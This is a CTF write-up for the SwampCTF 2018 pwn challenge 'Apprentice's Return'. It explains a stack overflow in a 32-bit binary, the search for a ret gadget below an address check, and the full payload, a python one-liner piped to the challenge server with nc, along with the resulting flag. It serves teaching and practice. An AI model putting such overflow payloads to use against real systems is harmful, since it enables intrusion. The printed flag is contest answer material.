#### SwampCTF 2018 - Apprentice's Return 399 - Pwn

##### Challenge

For one such as yourself, apprentice to the arts of time manipulation, you must pass this first trial with a dreadful creature.

Connect:
nc chal1.swampctf.com 1802




##### Solution

File:

```
return: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e510acf107cc9f91edd02f76f14598fcb30de6b, not stripped
```

First, we have to know what is the functionality of the program. To do it, we did reverse engineering to understand the program. 

Summarizing, the program gets a string of maximum length (50 chars) and check that in the position 42 of this string is less or equal than "0x8048595", if this condition is ok, we will avoid the exit function and we will jump to the final of the function doBattle. 

![](https://unam.re/static/files/apprentice_return_1.png)


Finally, in the return of the function doBattle we will overwrite the original address with the function that execute system.

![](https://unam.re/static/files/apprentice_return_2.png)

The difficulty is that the address of the comparison and where we will jump need to be less than 0x8048595, so we need to find a "ret" instruction in a position less of 0x8048595

```bash
$ ./Ropper.py --file ~/CTF/SWAMPCTF/pwn/return --search "ret"
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: /home/manu/CTF/SWAMPCTF/pwn/return
0x08048545: ret 0x2b76; 
0x0804853e: ret 0x95b8; 
0x0804847e: ret 0xeac1; 
0x080485ea: ret 0xfffd; 
0x0804835a: ret; 
```

0x0804835a is perfect for our purpose. So, we just need to write the address of the function that perform the system function after than 0x0804835a.

![](https://unam.re/static/files/apprentice_return_3.png)

The final exploit:

```
"A"*42+<ret address>+<slayTheBeast function>
```

###### Exploitation

```bash
$ python -c 'print "A"*42+"\x5a\x83\x04\x08"+"\xdc\x85\x04\x08"' > input
$ cat input | nc chal1.swampctf.com 1802
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do: 
Your actions take the Allip by surprise, causing it to falter in its attack!  You notice a weakness in the beasts form and see a glimmer of how it might be defeated.
Through expert manouvering of both body and mind, you lash out with your ethereal blade and pierce the beast's heart, slaying it.
As it shimmers and withers, you quickly remember to lean in and command it to relinquish its secret: 
flag{f34r_n0t_th3_4nc13n7_R0pn1qu3}
```

